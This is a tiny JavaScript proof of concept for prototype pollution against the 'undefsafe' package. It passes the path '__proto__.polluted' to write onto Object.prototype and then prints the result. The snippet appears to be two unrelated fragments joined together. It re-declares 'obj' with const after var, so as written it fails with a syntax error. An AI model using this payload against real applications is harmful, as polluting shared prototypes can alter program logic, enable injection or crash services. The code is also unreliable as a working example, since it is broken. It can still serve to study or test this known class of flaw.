var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const a = require('undefsafe');
const obj = {};
const payload = '__proto__.polluted';
a(obj, payload, 'yes');
console.log('{ ' + obj.polluted + ', ' + 'yes' + ' }');